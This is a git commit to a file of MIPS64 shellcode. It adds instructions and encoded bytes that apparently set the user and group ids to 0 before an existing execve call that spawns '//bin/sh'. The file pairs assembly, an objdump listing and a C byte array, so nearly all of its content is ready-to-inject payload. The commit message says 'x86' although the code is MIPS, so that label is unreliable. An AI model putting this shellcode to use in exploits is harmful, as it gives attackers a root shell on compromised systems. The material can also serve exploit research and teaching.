5b9188a0d97eef8035372248742ff6cfcca081a0
nicephil <nicephil@gmail.com>
2012-05-25 21:33:29 +0800

    x86 security

--- security/mips64r2_shellcode/aa.c
+++ security/mips64r2_shellcode/aa.c
@@ -3,6 +3,11 @@
 .text
 .global __start
 __start:
+slti    $a0,$zero,-1
+li      $v0,5102    
+syscall 0x40404     
+li      $v0,5103    
+syscall 0x40404     
 slti	$a2,$zero,-1
 lui	$t8,0x2f2f
 ori	$t8,$t8,0x6269
@@ -17,18 +22,23 @@ li	$v0,5057
 syscall 0x40404
   
 objdump:
-   0:	2806ffff 	slti	a2,zero,-1
-   4:	3c182f2f 	lui	t8,0x2f2f
-   8:	37186269 	ori	t8,t8,0x6269
-   c:	afb8fff4 	sw	t8,-12(sp)
-  10:	3c186e2f 	lui	t8,0x6e2f
-  14:	37187368 	ori	t8,t8,0x7368
-  18:	afb8fff8 	sw	t8,-8(sp)
-  1c:	afa0fffc 	sw	zero,-4(sp)
-  20:	67a4fff4 	daddiu	a0,sp,-12
-  24:	2805ffff 	slti	a1,zero,-1
-  28:	240213c1 	li	v0,5057
-  2c:	0101010c 	syscall 0x40404
+2804ffff    slti    $a0,$zero,-1
+24021333    li      $v0,5102    
+0101010c    syscall 0x40404     
+240213ef    li      $v0,5103    
+0101010c    syscall 0x40404     
+2806ffff 	slti	a2,zero,-1
+3c182f2f 	lui	t8,0x2f2f
+37186269 	ori	t8,t8,0x6269
+afb8fff4 	sw	t8,-12(sp)
+3c186e2f 	lui	t8,0x6e2f
+37187368 	ori	t8,t8,0x7368
+afb8fff8 	sw	t8,-8(sp)
+afa0fffc 	sw	zero,-4(sp)
+67a4fff4 	daddiu	a0,sp,-12
+2805ffff 	slti	a1,zero,-1
+240213c1 	li	v0,5057
+0101010c 	syscall 0x40404
    
 */
  
@@ -36,6 +46,11 @@ objdump:
  
  
 char sc[] = { 
+        "\x28\x04\xff\xff"        /* slti    $a0,$zero,-1  */
+        "\x24\x02\x13\x33"        /* li      $v0,5102      */
+        "\x01\x01\x01\x0c"        /* syscall 0x40404       */
+        "\x24\x02\x13\xef"        /* li      $v0,5103      */
+        "\x01\x01\x01\x0c"        /* syscall 0x40404       */
         "\x28\x06\xff\xff"        /* slti    $a2,$zero,-1   */
         "\x3c\x18\x2f\x2f"        /* lui     $t8,$0x2f2f    */
         "\x37\x18\x62\x69"        /* ori     $t8,$t8,$0x6269 */
